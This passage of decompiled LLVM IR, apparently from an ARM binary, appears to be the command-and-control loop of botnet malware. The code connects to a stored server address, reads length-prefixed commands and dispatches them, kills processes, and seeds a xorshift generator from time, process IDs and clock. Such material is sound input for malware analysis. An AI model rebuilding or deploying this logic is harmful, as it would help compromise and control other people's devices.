  br i1 %v2_f2d0, label %dec_label_pc_f358, label %dec_label_pc_f2d8

dec_label_pc_f2d8:                                ; preds = %dec_label_pc_f2c8
  %v3_f2dc = udiv i32 %v2_f358, 32
  %v3_f2e4 = mul nuw nsw i32 %v3_f2dc, 4
  %v2_f2e8 = add i32 %v3_f2e4, %v2_f014
  store i32 %v2_f2e8, i32* %r3.global-to-local, align 4
  %v1_f2ec = add i32 %v2_f2e8, -488
  %v2_f2ec = inttoptr i32 %v1_f2ec to i32*
  %v3_f2ec = load i32, i32* %v2_f2ec, align 4
  %v1_f2f0 = urem i32 %v2_f358, 32
  %v6_f2f4 = lshr i32 %v3_f2ec, %v1_f2f0
  store i32 %v6_f2f4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1a6c8.157 to i32), i32* %r3.global-to-local, align 4
  %v1_f300 = urem i32 %v6_f2f4, 2
  %v2_f300 = icmp eq i32 %v1_f300, 0
  store i8 0, i8* bitcast (i8** @global_var_1a6c8.157 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_1a68c.154 to i32), i32* @r5, align 4
  br i1 %v2_f300, label %dec_label_pc_f310, label %dec_label_pc_f4a0

dec_label_pc_f310:                                ; preds = %dec_label_pc_f2d8
  %v1_f314 = icmp ne i32 %v2_f358, -1
  call void @__pseudo_cond_branch(i1 %v1_f314, i32 ptrtoint (i32* @global_var_8dac.158 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_f31c = load i32, i32* @r5, align 4
  %v2_f31c = inttoptr i32 %v1_f31c to i32*
  store i32 -1, i32* %v2_f31c, align 4
  %v1_f324 = call i32 @sleep(i32 1)
  br label %dec_label_pc_f170.backedge

dec_label_pc_f170.backedge:                       ; preds = %dec_label_pc_f310, %dec_label_pc_f3fc, %dec_label_pc_f4d4, %dec_label_pc_f594, %dec_label_pc_f5b8, %dec_label_pc_f66c, %dec_label_pc_f678, %bb49, %dec_label_pc_f358, %dec_label_pc_f368, %dec_label_pc_f544, %bb51, %dec_label_pc_f618, %dec_label_pc_f5a8
  %v2_f17852.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_f170

dec_label_pc_f32c:                                ; preds = %dec_label_pc_f1e4
  store i32 %v2_f014, i32* %r2.global-to-local, align 4
  %v3_f338 = mul nuw nsw i32 %v3_f330, 4
  %v2_f33c = add i32 %v3_f338, %v2_f014
  store i32 %v2_f33c, i32* %r3.global-to-local, align 4
  %v1_f340 = add i32 %v2_f33c, -360
  %v2_f340 = inttoptr i32 %v1_f340 to i32*
  %v3_f340 = load i32, i32* %v2_f340, align 4
  %v1_f344 = urem i32 %v2_f32c, 32
  %v7_f34c = shl i32 1, %v1_f344
  %v8_f34c = or i32 %v3_f340, %v7_f34c
  store i32 %v8_f34c, i32* %r2.global-to-local, align 4
  store i32 %v8_f34c, i32* %v2_f340, align 4
  br label %dec_label_pc_f21c

dec_label_pc_f358:                                ; preds = %dec_label_pc_f2c8
  %v2_f35c = icmp eq i32 %v2_f358, -1
  store i32 ptrtoint (i32* @global_var_1a68c.154 to i32), i32* @r5, align 4
  br i1 %v2_f35c, label %dec_label_pc_f170.backedge, label %dec_label_pc_f368

dec_label_pc_f368:                                ; preds = %dec_label_pc_f358
  %v3_f368 = udiv i32 %v2_f358, 32
  %v3_f36c = mul nuw nsw i32 %v3_f368, 4
  %v2_f374 = add i32 %v3_f36c, %v2_f014
  store i32 %v2_f374, i32* %r3.global-to-local, align 4
  %v1_f378 = add i32 %v2_f374, -360
  %v2_f378 = inttoptr i32 %v1_f378 to i32*
  %v3_f378 = load i32, i32* %v2_f378, align 4
  %v1_f37c = urem i32 %v2_f358, 32
  %v6_f380 = lshr i32 %v3_f378, %v1_f37c
  store i32 %v6_f380, i32* %r2.global-to-local, align 4
  %v1_f384 = urem i32 %v6_f380, 2
  %v2_f384 = icmp eq i32 %v1_f384, 0
  br i1 %v2_f384, label %dec_label_pc_f170.backedge, label %dec_label_pc_f38c

dec_label_pc_f38c:                                ; preds = %dec_label_pc_f368
  %v6_f38c = inttoptr i32 %v3_f2cc to i8*
  store i8* %v6_f38c, i8** %stack_var_-38, align 4
  %v0_f394 = call i32* @__errno_location()
  %v1_f394 = ptrtoint i32* %v0_f394 to i32
  %v0_f398 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_f398, i32* %v0_f394, align 4
  store i32 %v1_f394, i32* @r8, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_f3ac = load i32, i32* @global_var_1a68c.154, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_f3b8 = call i32 @recv(i32 %v2_f3ac, i32* %v7_f498, i32 2, i32 16386)
  %v2_f3bc = icmp eq i32 %v5_f3b8, -1
  br i1 %v2_f3bc, label %dec_label_pc_f5a8, label %dec_label_pc_f3c4

dec_label_pc_f3c4:                                ; preds = %dec_label_pc_f38c
  %v2_f3c4 = icmp eq i32 %v5_f3b8, 0
  br i1 %v2_f3c4, label %dec_label_pc_f5b8, label %dec_label_pc_f3cc

dec_label_pc_f3cc:                                ; preds = %dec_label_pc_f3c4
  %v3_f3cc = load i8*, i8** %stack_var_-38, align 4
  %v4_f3cc = ptrtoint i8* %v3_f3cc to i32
  store i32 %v3_f2cc, i32* %r3.global-to-local, align 4
  %v4_f3d4 = mul nuw nsw i32 %v3_f2cc, 256
  %v5_f3d4 = or i32 %v4_f3cc, %v4_f3d4
  store i32 %v5_f3d4, i32* %r2.global-to-local, align 4
  %v7_f3d4 = icmp eq i32 %v5_f3d4, 0
  br i1 %v7_f3d4, label %dec_label_pc_f678, label %dec_label_pc_f3dc

dec_label_pc_f3dc:                                ; preds = %dec_label_pc_f3cc
  %v1_f3dc = mul i32 %v4_f3cc, 256
  %v3_f3e0 = and i32 %v1_f3dc, 65280
  %v4_f3e4 = udiv i32 %v5_f3d4, 256
  %v5_f3e4 = or i32 %v3_f3e0, %v4_f3e4
  %v6_f3e4 = trunc i32 %v4_f3e4 to i8
  store i32 %v5_f3e4, i32* %r2.global-to-local, align 4
  %v4_f3e8 = udiv i32 %v5_f3d4, 65536
  store i32 %v4_f3e8, i32* %r3.global-to-local, align 4
  %v3_f3ec = icmp slt i8 %v6_f3e4, 0
  %v7_f3f4 = inttoptr i32 %v4_f3e4 to i8*
  store i8* %v7_f3f4, i8** %stack_var_-38, align 4
  br i1 %v3_f3ec, label %dec_label_pc_f3fc, label %dec_label_pc_f5e8

dec_label_pc_f3fc:                                ; preds = %dec_label_pc_f3dc
  %v2_f3fc = load i32, i32* @global_var_1a68c.154, align 4
  %v1_f400 = call i32 @close(i32 %v2_f3fc)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_f408 = load i32, i32* @r5, align 4
  %v2_f408 = inttoptr i32 %v1_f408 to i32*
  store i32 -1, i32* %v2_f408, align 4
  br label %dec_label_pc_f170.backedge

dec_label_pc_f410:                                ; preds = %dec_label_pc_f1d4
  %v0_f418 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_f418, i32* %r2.global-to-local, align 4
  %v3_f41c = call i32 @socket(i32 2, i32 1, i32 %v0_f418)
  %v2_f420 = icmp eq i32 %v3_f41c, -1
  store i32 %v3_f41c, i32* %r5.global-to-local, align 4
  %v1_f428 = load i32, i32* %r8.global-to-local, align 4
  %v2_f428 = inttoptr i32 %v1_f428 to i32*
  store i32 %v3_f41c, i32* %v2_f428, align 4
  br i1 %v2_f420, label %dec_label_pc_f1e4, label %dec_label_pc_f430

dec_label_pc_f430:                                ; preds = %dec_label_pc_f410
  %v0_f430 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_f430, i32* %r2.global-to-local, align 4
  %v2_f438 = call i32 (i32, i32, ...) @fcntl(i32 %v3_f41c, i32 3)
  %v1_f440 = or i32 %v2_f438, 2048
  store i32 %v1_f440, i32* %r2.global-to-local, align 4
  %v0_f444 = load i32, i32* %r5.global-to-local, align 4
  %v2_f448 = call i32 (i32, i32, ...) @fcntl(i32 %v0_f444, i32 4)
  store i32 ptrtoint (i32* @global_var_1a690.128 to i32), i32* %r2.global-to-local, align 4
  %v2_f450 = load i32, i32* @global_var_1a690.128, align 4
  store i32 %v2_f450, i32* %r3.global-to-local, align 4
  %v2_f454 = icmp eq i32 %v2_f450, 0
  br i1 %v2_f454, label %.thread, label %bb50

bb50:                                             ; preds = %dec_label_pc_f430
  call void @__pseudo_branch(i32 ptrtoint (i32* @global_var_11c94.159 to i32))
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_f430, %bb50
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_f468 = load i32, i32* @global_var_1a68c.154, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_1a6c8.157 to i8*), align 4
  %v5_f478 = call i32 @connect(i32 %v2_f468, %sockaddr* bitcast (%sockaddr** @global_var_1a720.137 to %sockaddr*), i32 16)
  br label %dec_label_pc_f1e4

dec_label_pc_f480:                                ; preds = %dec_label_pc_f274
  %v2_f488 = load i32, i32* @global_var_1a68c.154, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v8_f498 = call i32 @send(i32 %v2_f488, i32* nonnull %v7_f498, i32 2, i32 16384)
  br label %dec_label_pc_f294

dec_label_pc_f4a0:                                ; preds = %dec_label_pc_f2d8
  store i32 4, i32* @r4, align 4
  store i32 %v2_f4a8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-48, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-52, align 4
  %v8_f4c4 = call i32 @getsockopt(i32 %v2_f358, i32 1, i32 4, i32* nonnull %stack_var_-48, i32* nonnull %stack_var_-52)
  %v3_f4c8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_f4c8, i32* %r3.global-to-local, align 4
  %v2_f4cc = icmp eq i32 %v3_f4c8, 0
  br i1 %v2_f4cc, label %dec_label_pc_f544, label %dec_label_pc_f4d4

dec_label_pc_f4d4:                                ; preds = %dec_label_pc_f4a0
  %v2_f4d4 = load i32, i32* @global_var_1a68c.154, align 4
  %v1_f4d8 = call i32 @close(i32 %v2_f4d4)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_f4e0 = load i32, i32* @r5, align 4
  %v2_f4e0 = inttoptr i32 %v1_f4e0 to i32*
  store i32 -1, i32* %v2_f4e0, align 4
  %v0_f4e4 = call i32 @function_f6c4()
  %v2_f4ec = urem i32 %v0_f4e4, 10
  %v1_f4f0 = add nuw nsw i32 %v2_f4ec, 1
  %v1_f4f4 = call i32 @sleep(i32 %v1_f4f0)
  br label %dec_label_pc_f170.backedge

dec_label_pc_f4fc:                                ; preds = %dec_label_pc_f2a4
  %v1_f524 = sub i32 0, %v1_f12c
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 %v2_f4a8, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-48, align 4
  %v8_f514 = call i32 @accept(i32 %v2_f298, %sockaddr* %tmp48, i32* nonnull %stack_var_-48)
  %v1_f518 = call i32 @function_df30(i32 %v8_f514)
  store i32 %v1_f12c, i32* %r2.global-to-local, align 4
  %v2_f528 = call i32 @kill(i32 %v1_f524, i32 9)
  store i32 ptrtoint (i32* @global_var_1a6c4.142 to i32), i32* %r3.global-to-local, align 4
  %v2_f530 = load i32, i32* @global_var_1a6c4.142, align 4
  %v2_f534 = icmp eq i32 %v2_f530, 0
  br i1 %v2_f534, label %dec_label_pc_f53c, label %dec_label_pc_f5dc

dec_label_pc_f53c:                                ; preds = %dec_label_pc_f4fc, %dec_label_pc_f5dc
  call void @exit(i32 0)
  unreachable

dec_label_pc_f544:                                ; preds = %dec_label_pc_f4a0
  %v2_f548 = call i32 @function_119dc(i8* %v1_f548)
  %sext = mul i32 %v2_f548, 16777216
  %v1_f54c = sdiv i32 %sext, 16777216
  %v7_f54c = inttoptr i32 %v1_f54c to i8*
  store i8* %v7_f54c, i8** %stack_var_-38, align 4
  %v0_f550 = call i32 @function_11c94()
  store i32 %v0_f550, i32* @global_var_1a714.104, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f564 = load i32, i32* @r4, align 4
  store i32 %v0_f564, i32* %r2.global-to-local, align 4
  %v0_f568 = load i32, i32* @r5, align 4
  %v1_f568 = inttoptr i32 %v0_f568 to i32*
  %v2_f568 = load i32, i32* %v1_f568, align 4
  %v5_f56c = call i32 @send(i32 %v2_f568, i32* nonnull @global_var_12284.162, i32 %v0_f564, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_f578 = load i32, i32* @r5, align 4
  %v1_f578 = inttoptr i32 %v0_f578 to i32*
  %v2_f578 = load i32, i32* %v1_f578, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_f584 = call i32 @send(i32 %v2_f578, i32* %v7_f498, i32 1, i32 16384)
  %v3_f588 = load i8*, i8** %stack_var_-38, align 4
  %v4_f588 = ptrtoint i8* %v3_f588 to i32
  store i32 %v4_f588, i32* %r2.global-to-local, align 4
  %v3_f58c = icmp eq i8* %v3_f588, null
  br i1 %v3_f58c, label %dec_label_pc_f170.backedge, label %dec_label_pc_f594

dec_label_pc_f594:                                ; preds = %dec_label_pc_f544
  %v0_f594 = load i32, i32* @r5, align 4
  %v1_f594 = inttoptr i32 %v0_f594 to i32*
  %v2_f594 = load i32, i32* %v1_f594, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_f5a0 = call i32 @send(i32 %v2_f594, i32* nonnull %stack_var_-140, i32 %v4_f588, i32 16384)
  br label %dec_label_pc_f170.backedge

dec_label_pc_f5a8:                                ; preds = %dec_label_pc_f5e8, %dec_label_pc_f38c
  %v0_f5a8 = load i32, i32* @r8, align 4
  %v1_f5a8 = inttoptr i32 %v0_f5a8 to i32*
  %v2_f5a8 = load i32, i32* %v1_f5a8, align 4
  store i32 %v2_f5a8, i32* %r3.global-to-local, align 4
  %v7_f5ac = icmp eq i32 %v2_f5a8, 4
  br i1 %v7_f5ac, label %dec_label_pc_f170.backedge, label %bb51

bb51:                                             ; preds = %dec_label_pc_f5a8
  %v8_f5b0 = icmp eq i32 %v2_f5a8, 11
  br i1 %v8_f5b0, label %dec_label_pc_f170.backedge, label %dec_label_pc_f5b8

dec_label_pc_f5b8:                                ; preds = %dec_label_pc_f610, %bb51, %dec_label_pc_f3c4
  %v2_f5b8 = load i32, i32* @global_var_1a68c.154, align 4
  %v1_f5c0 = icmp ne i32 %v2_f5b8, -1
  call void @__pseudo_cond_branch(i1 %v1_f5c0, i32 ptrtoint (i32* @global_var_8dac.158 to i32))
  store i32 ptrtoint (i32* @global_var_1a68c.154 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_1a68c.154, align 4
  %v1_f5d4 = call i32 @sleep(i32 1)
  br label %dec_label_pc_f170.backedge

dec_label_pc_f5dc:                                ; preds = %dec_label_pc_f4fc
  %v2_f5e0 = call i32 @kill(i32 %v2_f530, i32 9)
  br label %dec_label_pc_f53c

dec_label_pc_f5e8:                                ; preds = %dec_label_pc_f3dc
  %v0_f5e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_f5e8 = load i32, i32* @r8, align 4
  %v2_f5e8 = inttoptr i32 %v1_f5e8 to i32*
  store i32 %v0_f5e8, i32* %v2_f5e8, align 4
  store i32 %v2_f5f0, i32* @r4, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_f5fc = load i32, i32* @global_var_1a68c.154, align 4
  %v9_f604 = call i32 @recv(i32 %v2_f5fc, i32* nonnull %stack_var_-1548, i32 %v4_f3e4, i32 16386)
  %v2_f608 = icmp eq i32 %v9_f604, -1
  br i1 %v2_f608, label %dec_label_pc_f5a8, label %dec_label_pc_f610

dec_label_pc_f610:                                ; preds = %dec_label_pc_f5e8
  %v2_f610 = icmp eq i32 %v9_f604, 0
  br i1 %v2_f610, label %dec_label_pc_f5b8, label %dec_label_pc_f618

dec_label_pc_f618:                                ; preds = %dec_label_pc_f610
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_f628 = load i32, i32* @global_var_1a68c.154, align 4
  %v5_f62c = call i32 @recv(i32 %v2_f628, i32* nonnull %v7_f498, i32 2, i32 16384)
  %v3_f630 = load i8*, i8** %stack_var_-38, align 4
  %v4_f630 = ptrtoint i8* %v3_f630 to i32
  %v4_f634 = urem i32 %v4_f3e8, 256
  %v4_f638 = mul i32 %v4_f630, 256
  %v5_f638 = or i32 %v4_f638, %v4_f634
  store i32 %v5_f638, i32* %r2.global-to-local, align 4
  %v3_f640 = sdiv i32 %v4_f638, 256
  store i32 %v3_f640, i32* @lr, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_f64c = load i32, i32* @global_var_1a68c.154, align 4
  %v6_f654 = inttoptr i32 %v5_f638 to i8*
  store i8* %v6_f654, i8** %stack_var_-38, align 4
  %v8_f658 = call i32 @recv(i32 %v2_f64c, i32* nonnull %stack_var_-1548, i32 %v5_f638, i32 16384)
  %v3_f65c = load i8*, i8** %stack_var_-38, align 4
  %v4_f65c = ptrtoint i8* %v3_f65c to i32
  store i32 %v4_f65c, i32* %r2.global-to-local, align 4
  %v4_f660 = urem i32 %v3_f640, 256
  store i32 %v4_f660, i32* %r3.global-to-local, align 4
  %v6_f664 = mul nuw nsw i32 %v4_f660, 256
  %v7_f664 = or i32 %v4_f65c, %v6_f664
  %v9_f664 = icmp eq i32 %v7_f664, 0
  br i1 %v9_f664, label %dec_label_pc_f170.backedge, label %dec_label_pc_f66c

dec_label_pc_f66c:                                ; preds = %dec_label_pc_f618
  %v7_f670 = call i32 @function_904c(i32* nonnull %stack_var_-1548, i32 %v7_f664, i32 %v4_f65c, i32 %v4_f660)
  br label %dec_label_pc_f170.backedge

dec_label_pc_f678:                                ; preds = %dec_label_pc_f3cc
  %v2_f67c = load i32, i32* @global_var_1a68c.154, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_f68c = call i32 @recv(i32 %v2_f67c, i32* nonnull %v7_f498, i32 2, i32 16384)
  br label %dec_label_pc_f170.backedge

; uselistorder directives
  uselistorder i32 %v4_f660, { 2, 0, 1 }
  uselistorder i32 %v4_f65c, { 1, 0, 2 }
  uselistorder i32 %v3_f640, { 1, 0 }
  uselistorder i32 %v5_f638, { 1, 0, 2 }
  uselistorder i32 %v4_f638, { 1, 0 }
  uselistorder i32 %v3_f41c, { 0, 2, 1, 3 }
  uselistorder i32 %v4_f3e4, { 2, 3, 0, 1 }
  uselistorder i32 %v2_f358, { 5, 2, 1, 6, 0, 4, 3 }
  uselistorder i32 %v2_f298, { 2, 1, 0, 3 }
  uselistorder i32 %v13_f25c, { 1, 0, 2 }
  uselistorder i32 %v2_f1a4, { 1, 0, 2 }
  uselistorder i32 %v1_f194, { 1, 2, 0 }
  uselistorder i32 %v1_f17c, { 1, 2, 0 }
  uselistorder i32* %v7_f498, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v2_f07c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_f014, { 0, 1, 9, 2, 3, 8, 4, 5, 6, 7, 10 }
  uselistorder i32 %v2_f004, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_ef44, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %stack_var_-140, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i8** %stack_var_-38, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-1548, { 1, 0, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 0, 5, 4, 1, 2, 3, 6, 7, 8, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 26, 27, 29, 28, 30, 31, 32, 33, 24, 34, 35, 36, 48, 49, 40, 41, 37, 46, 47, 38, 39, 42, 43, 44, 45 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38 }
  uselistorder i32* @global_var_1a6c4.142, { 1, 2, 0 }
  uselistorder i32 (i32, i32)* @kill, { 0, 4, 3, 2, 7, 5, 1, 6, 8 }
  uselistorder i8 1, { 1, 2, 0, 3 }
  uselistorder i32 16386, { 1, 2, 0, 3 }
  uselistorder i32 (i32)* @sleep, { 4, 9, 0, 8, 7, 6, 5, 3, 1, 2, 10 }
  uselistorder i8* bitcast (i8** @global_var_1a6c8.157 to i8*), { 0, 1, 3, 2 }
  uselistorder i8** @global_var_1a6c8.157, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1a6c8.157 to i32), { 2, 1, 0 }
  uselistorder i32* @global_var_1a68c.154, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 13, 12, 15, 14 }
  uselistorder i32* @global_var_1a688.130, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9 }
  uselistorder i32 (i32)* @function_ee24, { 1, 0 }
  uselistorder i32 (i32)* @function_e4e0, { 1, 0 }
  uselistorder i32 (i32)* @function_937c, { 1, 0 }
  uselistorder i32 (i32, i32*, i32)* @write, { 1, 0, 2 }
  uselistorder i32 (i8*, i32)* @function_11a04, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 19, 20, 21, 22, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 (i32, i32)* @function_f778, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_ec60, { 1, 0 }
  uselistorder i32* @global_var_1a690.128, { 2, 3, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_edd0.126 to i32), { 0, 2, 1 }
  uselistorder %sockaddr** @global_var_1a720.137, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f53c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_f170.backedge, { 6, 5, 12, 4, 11, 13, 3, 10, 2, 1, 9, 8, 0, 7 }
  uselistorder label %dec_label_pc_f294, { 2, 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_f1e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f1d4, { 1, 0 }
  uselistorder label %dec_label_pc_f190.dec_label_pc_f190_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_f178.dec_label_pc_f178_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_efd0, { 2, 0, 1 }
}

define i32 @function_f6c4() local_unnamed_addr {
dec_label_pc_f6c4:
  %v2_f6d0 = load i32, i32* @global_var_1a6cc.164, align 4
  %v2_f6d4 = load i32, i32* @global_var_1a6d8.166, align 4
  %v4_f6e0 = mul i32 %v2_f6d0, 2048
  %v5_f6e0 = xor i32 %v4_f6e0, %v2_f6d0
  %v4_f6e4 = udiv i32 %v2_f6d4, 524288
  %v5_f6e4 = xor i32 %v4_f6e4, %v2_f6d4
  %v2_f6e8 = load i32, i32* @global_var_1a6d0.168, align 4
  %v2_f6ec = load i32, i32* @global_var_1a6d4.170, align 4
  %v2_f6f0 = xor i32 %v5_f6e4, %v5_f6e0
  %v4_f6f4 = udiv i32 %v5_f6e0, 256
  %v5_f6f4 = xor i32 %v2_f6f0, %v4_f6f4
  store i32 %v2_f6e8, i32* @global_var_1a6cc.164, align 4
  store i32 %v2_f6ec, i32* @global_var_1a6d0.168, align 4
  store i32 %v2_f6d4, i32* @global_var_1a6d4.170, align 4
  store i32 %v5_f6f4, i32* @global_var_1a6d8.166, align 4
  ret i32 %v5_f6f4

; uselistorder directives
  uselistorder i32 %v2_f6d4, { 2, 1, 0 }
  uselistorder i32 %v2_f6d0, { 1, 0 }
}

define i32 @function_f71c(i32 %arg1) local_unnamed_addr {
dec_label_pc_f71c:
  %stack_var_-12 = alloca i32, align 4
  %v3_f71c = load i32, i32* @r4, align 4
  store i32 %v3_f71c, i32* %stack_var_-12, align 4
  %v2_f724 = call i32 @time(i32* null)
  store i32 %v2_f724, i32* @global_var_1a6cc.164, align 4
  %v1_f730 = call i32 @getpid()
  %v0_f738 = call i32 @getppid()
  %v2_f740 = xor i32 %v1_f730, %v0_f738
  store i32 %v2_f740, i32* @global_var_1a6d0.168, align 4
  %v1_f748 = call i32 @clock()
  %v2_f74c = load i32, i32* @global_var_1a6d0.168, align 4
  %v2_f758 = xor i32 %v2_f74c, %v1_f748
  store i32 %v2_f758, i32* @global_var_1a6d8.166, align 4
  store i32 %v1_f748, i32* @global_var_1a6d4.170, align 4
  %v2_f764 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f764, i32* @r4, align 4
  ret i32 %v1_f748

; uselistorder directives
  uselistorder i32 %v1_f748, { 1, 2, 0 }
  uselistorder i32 ()* @getppid, { 1, 2, 0, 3 }
  uselistorder i32 ()* @getpid, { 2, 1, 0, 3 }
}

define i32 @function_f778(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f778:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_f778 = load i32, i32* @r4, align 4
  store i32 %v3_f778, i32* %stack_var_-36, align 4
  %v6_f778 = load i32, i32* @r5, align 4
  %v9_f778 = load i32, i32* @r6, align 4
  %v12_f778 = load i32, i32* @r7, align 4
  %v28_f778 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_f78c = call i32 @function_11394(i32 31)
  %v3_f798 = call i32 @function_112b0(i32 31, i32* null)
  %v1_f79c = inttoptr i32 %v3_f798 to i8*
  %tmp12 = bitcast i32* %stack_var_-68 to i8*
  %v6_f7a4 = call i8* @strcpy(i8* %tmp12, i8* %v1_f79c)
  %v2_f7a8 = icmp eq i32 %arg2, 0
  br i1 %v2_f7a8, label %dec_label_pc_f824, label %dec_label_pc_f7b0

dec_label_pc_f7b0:                                ; preds = %dec_label_pc_f778
  store i32 ptrtoint (i32* @global_var_1a6cc.164 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a6d0.168 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a6d4.170 to i32), i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_1a6d8.166 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_f7c4

dec_label_pc_f7c4:                                ; preds = %dec_label_pc_f7c4.dec_label_pc_f7c4_crit_edge, %dec_label_pc_f7b0
  %v1_f7e8 = phi i32 [ %v1_f7e8.pre, %dec_label_pc_f7c4.dec_label_pc_f7c4_crit_edge ], [ ptrtoint (i32* @global_var_1a6cc.164 to i32), %dec_label_pc_f7b0 ]
  %v2_f7c4 = load i32, i32* @global_var_1a6d8.166, align 4
  store i32 %v2_f7c4, i32* %r2.global-to-local, align 4
  %v2_f7c8 = load i32, i32* @global_var_1a6cc.164, align 4
  %v4_f7cc = udiv i32 %v2_f7c4, 524288
  %v5_f7cc = xor i32 %v4_f7cc, %v2_f7c4
  %v4_f7d0 = mul i32 %v2_f7c8, 2048
  %v5_f7d0 = xor i32 %v4_f7d0, %v2_f7c8
  %v2_f7d4 = xor i32 %v5_f7cc, %v5_f7d0
  %v2_f7d8 = load i32, i32* @global_var_1a6d0.168, align 4
  %v2_f7dc = load i32, i32* @global_var_1a6d4.170, align 4
  store i32 %v2_f7dc, i32* %ip.global-to-local, align 4
  %v4_f7e0 = udiv i32 %v5_f7d0, 256
  %v5_f7e0 = xor i32 %v2_f7d4, %v4_f7e0
  store i32 %v5_f7e0, i32* @r4, align 4
  %v2_f7e8 = inttoptr i32 %v1_f7e8 to i32*
  store i32 %v2_f7d8, i32* %v2_f7e8, align 4
  %v0_f7ec = load i32, i32* %ip.global-to-local, align 4
  %v1_f7ec = load i32, i32* %r8.global-to-local, align 4
  %v2_f7ec = inttoptr i32 %v1_f7ec to i32*
  store i32 %v0_f7ec, i32* %v2_f7ec, align 4
  %v0_f7f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_f7f0 = load i32, i32* @r7, align 4
  %v2_f7f0 = inttoptr i32 %v1_f7f0 to i32*
  store i32 %v0_f7f0, i32* %v2_f7f0, align 4
  %v0_f7f4 = load i32, i32* @r4, align 4
  %v1_f7f4 = load i32, i32* @r6, align 4
  %v2_f7f4 = inttoptr i32 %v1_f7f4 to i32*
  store i32 %v0_f7f4, i32* %v2_f7f4, align 4
  %v2_f7f8 = call i32 @function_119dc(i8* %tmp12)
  %v0_f800 = load i32, i32* @r4, align 4
  %v2_f804 = urem i32 %v0_f800, %v2_f7f8
  %v2_f80c = add i32 %v2_f804, %v28_f778
  %v1_f810 = add i32 %v2_f80c, -32
  %v2_f810 = inttoptr i32 %v1_f810 to i8*
  %v3_f810 = load i8, i8* %v2_f810, align 1
  %v2_f814 = load i32, i32* @r5, align 4
